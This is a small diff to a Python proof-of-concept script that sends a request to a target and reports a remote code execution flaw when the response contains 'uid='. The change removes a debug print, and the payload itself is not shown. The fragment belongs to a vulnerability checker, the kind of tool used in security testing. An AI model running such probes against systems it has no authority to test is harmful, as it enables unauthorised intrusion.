@@ -31,7 +31,6 @@ def poc(target):
 
     try:
         res2=requests.post(url=target+payload,timeout=5,verify=False,json=data,headers=headers1)
-        print(res2.text)
         if res2.status_code ==200:
               if 'uid=' in res2.text:
                 print(f"[+]{target}存在远程代码RCE漏洞")
